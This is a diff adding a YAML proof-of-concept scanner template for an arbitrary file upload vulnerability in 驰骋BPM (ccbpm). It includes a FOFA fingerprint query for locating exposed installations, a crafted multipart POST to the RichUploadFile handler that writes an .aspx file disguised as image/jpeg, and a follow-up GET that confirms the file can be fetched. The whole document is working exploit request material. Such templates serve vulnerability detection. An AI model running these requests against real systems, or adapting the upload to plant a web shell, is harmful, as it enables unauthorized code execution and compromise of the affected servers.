@@ -1,0 +1,32 @@
+id: poc-yaml-ccbpm-richuploadfile-anyfile-upload
+info:
+  name: 驰骋BPM RichUploadFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 驰骋BPM
+  fofa: body="/WF/AppClassic/Home.htm" || body="ccbpm" || body="/DataUser/Icon/LogBig.png"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="edit"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: "status_code == 200 && \ncontains(body,\".aspx\") &&\n!contains(body,\"\
+    <\")\n"
+- method: GET
+  path: /DataUser/RichTextFile/Mazi/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
